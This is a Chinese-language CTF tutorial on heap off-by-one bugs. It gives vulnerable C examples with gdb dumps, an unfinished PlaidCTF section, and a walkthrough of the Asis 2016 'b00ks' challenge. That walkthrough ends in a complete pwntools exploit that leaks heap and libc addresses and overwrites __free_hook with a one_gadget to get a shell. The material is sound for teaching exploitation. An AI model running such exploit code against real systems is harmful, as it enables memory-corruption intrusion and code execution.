# 堆中的 Off-By-One

## 介绍

严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。

## off-by-one 漏洞原理

off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括

- 使用循环语句向堆块中写入数据时，循环的次数设置错误(这在 C 语言初学者中很常见)导致多写入了一个字节。
- 字符串操作不合适

一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于Linux堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。
此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上(heap based)的off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。

### 示例1

```
int my_gets(char *ptr,int size)
{
    int i;
    for(i=0;i<=size;i++)
    {
        ptr[i]=getchar();
    }
    return i;
}
int main()
{
    void *chunk1,*chunk2;
    chunk1=malloc(16);
    chunk2=malloc(16);
    puts("Get Input:");
    my_gets(chunk1,16);
    return 0;
}
```

我们自己编写的 my_gets 函数导致了一个off-by-one漏洞，原因是for循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误

> wikipedia:
> 栅栏错误（有时也称为电线杆错误或者灯柱错误）是差一错误的一种。如以下问题：
>
>     建造一条直栅栏（即不围圈），长30米、每条栅栏柱间相隔3米，需要多少条栅栏柱？
>
> 最容易想到的答案10是错的。这个栅栏有10个间隔，11条栅栏柱。

我们使用 gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为16字节的堆块
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021 <=== chunk2
0x602030:	0x0000000000000000	0x0000000000000000
```
当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域
print 'A'*17
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x4141414141414141	0x4141414141414141
0x602020:	0x0000000000000041	0x0000000000000021 <=== chunk2 
0x602030:	0x0000000000000000	0x0000000000000000
```

### 示例2

第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误

```
int main(void)
{
    char buffer[40]="";
    void *chunk1;
    chunk1=malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer)==24)
    {
        strcpy(chunk1,buffer);
    }
    return 0;
    
}
```

程序乍看上去没有任何问题(不考虑栈溢出)，可能很多人在实际的代码中也是这样写的。
但是 strlen 和 strcpy 的行为不一致却导致了off-by-one 的发生。
strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 `'\x00'` 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 `'\x00'` 。这就导致了我们向chunk1中写入了25个字节，我们使用gdb进行调试可以看到这一点。

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000411 <=== next chunk
```

在我们输入'A'*24后执行strcpy

```
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x4141414141414141	0x4141414141414141
0x602020:	0x4141414141414141	0x0000000000000400
```

可以看到 next chunk 的 size 域低字节被结束符 `'\x00'` 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。
还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的CPU的字节序都是小端法的，比如一个DWORD值在使用小端法的内存中是这样储存的

```
DWORD 0x41424344
内存  0x44,0x43,0x42,0x41
```

### 小总结

上面的示例其实也展示了寻找 off-by-one 中比较重要的几个步骤:

#### 注意循环边界

在进行诸如循环写入的操作时，要特别注意循环的次数是否存在边界问题导致的 off-by-one。

#### 注意字符串操作

字符串结束符处理的不严谨往往会导致 off-by-one 问题。

## 例子

### 基本信息

```shell
➜  2015_plaidctf_datastore git:(master) file datastore 
datastore: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=1a031710225e93b0b5985477c73653846c352add, stripped
➜  2015_plaidctf_datastore git:(master) checksec datastore 
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
➜  2015_plaidctf_datastore git:(master) 
```

可以看出，该程序是64位动态链接的。保护全部开启。。。

## 功能分析

待完成。

## 题目

# b00ks

## 介绍

Asis CTF 2016的一道题目，[链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks)，考察点是null byte off-by-one

## 题目介绍


题目是一个常见的选单式程序，功能是一个图书管理系统。

```
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
```

程序提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示。

```
Canary                        : No
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Full
```

程序每创建一个book会分配0x20字节的结构来维护它的信息

```
struct book
{
    int id;
    char *name;
    char *description;
    int size;
}
```


## create

book结构中存在name和description，name和description在堆上分配。首先分配name buffer，使用malloc，大小自定但小于32。

```
printf("\nEnter book name size: ", *(_QWORD *)&size);
__isoc99_scanf("%d", &size);
printf("Enter book name (Max 32 chars): ", &size);
ptr = malloc(size);
```

之后分配description，同样大小自定但无限制。

```
printf("\nEnter book description size: ", *(_QWORD *)&size);
        __isoc99_scanf("%d", &size);
       
v5 = malloc(size);
```

之后分配book结构的内存

```
book = malloc(0x20uLL);
if ( book )
{
    *((_DWORD *)book + 6) = size;
    *((_QWORD *)off_202010 + v2) = book;
    *((_QWORD *)book + 2) = description;
    *((_QWORD *)book + 1) = name;
    *(_DWORD *)book = ++unk_202024;
    return 0LL;
}
```

## 漏洞

程序编写的read函数存在null byte off-by-one漏洞，仔细观察这个read函数可以发现对于边界的考虑是不当的。

```
signed __int64 __fastcall my_read(_BYTE *ptr, int number)
{
  int i; // [rsp+14h] [rbp-Ch]
  _BYTE *buf; // [rsp+18h] [rbp-8h]

  if ( number <= 0 )
    return 0LL;
  buf = ptr;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, buf, 1uLL) != 1 )
      return 1LL;
    if ( *buf == '\n' )
      break;
    ++buf;
    if ( i == number )
      break;
  }
  *buf = 0;
  return 0LL;
}
```

## 利用

### 泄漏


因为程序中的my_read函数存在null byte off-by-one，事实上my_read读入的结束符'\x00'是写入到0x555555756060的位置的。这样当0x555555756060～0x555555756068写入book指针时就会覆盖掉结束符'\x00'，所以这里是存在一个地址泄漏的漏洞。通过打印author name就可以获得pointer array中第一项的值。

```
0x555555756040:	0x6161616161616161	0x6161616161616161
0x555555756050:	0x6161616161616161	0x6161616161616161   <== author name
0x555555756060:	0x0000555555757480 <== pointer array	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
```

为了实现泄漏，首先在author name中需要输入32个字节来使得结束符被覆盖掉。之后我们创建book1，这个book1的指针会覆盖

```
def js(str):
     return io.recvuntil(str)

def jsn(num):
     return io.recvn(num)

def fs(str):
     io.sendline(str)

def fsn(str):
     io.send(str)
     
js('Enter author name:') #input author name
fs('a'*32)
    
js('>')# create book1
fs('1')
js('Enter book name size:')
fs('32')
js('Enter book name (Max 32 chars):')
fs('object1')
js('Enter book description size:')
fs('32')
js('Enter book description:')
fs('object1')
    
js('>')# print book1
fs('4')
js('Author:')
js('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
book1_addr=jsn(6)
book1_addr=book1_addr.ljust(8,'\x00')
book1_addr=u64(book1_addr)
```


### off-by-one覆盖指针低字节

程序中同样提供了一种change功能，change功能用于修改author name，所以通过change可以写入author name，利用off-by-one覆盖pointer array第一个项的低字节。


覆盖掉book1指针的低字节后，这个指针会指向book1的description，由于程序提供了edit功能可以任意修改description中的内容。我们可以提前在description中布置数据伪造成一个book结构，这个book结构的description和name指针可以由直接控制。

```
def off_by_one(addr):
    addr+=58
    js('>')# create fake book in description
    fs('3')
    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) 
    js('Enter new book description:')
    fs(fake_book_data)      # <== fake book
    

    js('>')# change author name
    fs('5')
    js('Enter author name:')
    fs('a'*32)          # <== off-by-one
```

这里在description中伪造了book，使用的数据是p64(0x1)+p64(addr)+p64(addr)+pack(0xffff)。
其中addr+58是为了使指针指向book2的指针地址，使得我们可以任意修改这些指针值。


### 通过栈实现利用

通过前面2部分我们已经获得了任意地址读写的能力，读者读到这里可能会觉得下面的操作是显而易见的，比如写got表劫持流程或者写__malloc_hook劫持流程等。但是这个题目特殊之处在于开启PIE并且没有泄漏libc基地址的方法，因此我们还需要想一下其他的办法。

这道题的巧妙之处在于在分配第二个book时，使用一个很大的尺寸，使得堆以mmap模式进行拓展。我们知道堆有两种拓展方式一种是brk会直接拓展原来的堆，另一种是mmap会单独映射一块内存。

在这里我们申请一个超大的块，来使用mmap扩展内存。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址。
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/123/123
0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- 
0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap
0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- 
0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]
0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]
0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/123/123
0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- 
0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap
0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- 
0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]
0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]
0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

### EXP
```python
from pwn import *
context.log_level="info"

binary=ELF("b00ks")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io=process("./b00ks")


def createbook(name_size,name,des_size,des):
	io.readuntil("> ")
	io.sendline("1")
	io.readuntil(": ")
	io.sendline(str(name_size))
	io.readuntil(": ")
	io.sendline(name)
	io.readuntil(": ")
	io.sendline(str(des_size))
	io.readuntil(": ")
	io.sendline(des)

def printbook(id):
	io.readuntil("> ")
	io.sendline("4")
	io.readuntil(": ")
	for i in range(id):
		book_id=int(io.readline()[:-1])
		io.readuntil(": ")
		book_name=io.readline()[:-1]
		io.readuntil(": ")
		book_des=io.readline()[:-1]
		io.readuntil(": ")
		book_author=io.readline()[:-1]
	return book_id,book_name,book_des,book_author

def createname(name):
	io.readuntil("name: ")
	io.sendline(name)

def changename(name):
	io.readuntil("> ")
	io.sendline("5")
	io.readuntil(": ")
	io.sendline(name)

def editbook(book_id,new_des):
	io.readuntil("> ")
	io.sendline("3")
	io.readuntil(": ")
	io.writeline(str(book_id))
	io.readuntil(": ")
	io.sendline(new_des)

def deletebook(book_id):
	io.readuntil("> ")
	io.sendline("2")
	io.readuntil(": ")
	io.sendline(str(book_id))

createname("A"*32)
createbook(128,"a",32,"a")
createbook(0x21000,"a",0x21000,"b")


book_id_1,book_name,book_des,book_author=printbook(1)
book1_addr=u64(book_author[32:32+6].ljust(8,'\x00'))
log.success("book1_address:"+hex(book1_addr))

payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
editbook(book_id_1,payload)
changename("A"*32)
book_id_1,book_name,book_des,book_author=printbook(1)
book2_name_addr=u64(book_name.ljust(8,"\x00"))
book2_des_addr=u64(book_des.ljust(8,"\x00"))
log.success("book2 name addr:"+hex(book2_name_addr))
log.success("book2 des addr:"+hex(book2_des_addr))
libc_base=book2_des_addr-0x5b9010
log.success("libc base:"+hex(libc_base))

free_hook=libc_base+libc.symbols["__free_hook"]
one_gadget=libc_base+0x4f322 #0x4f2c5 0x10a38c 0x4f322
log.success("free_hook:"+hex(free_hook))
log.success("one_gadget:"+hex(one_gadget))
editbook(1,p64(free_hook)*2)
editbook(2,p64(one_gadget))
#gdb.attach(io)


deletebook(2)


io.interactive()
```
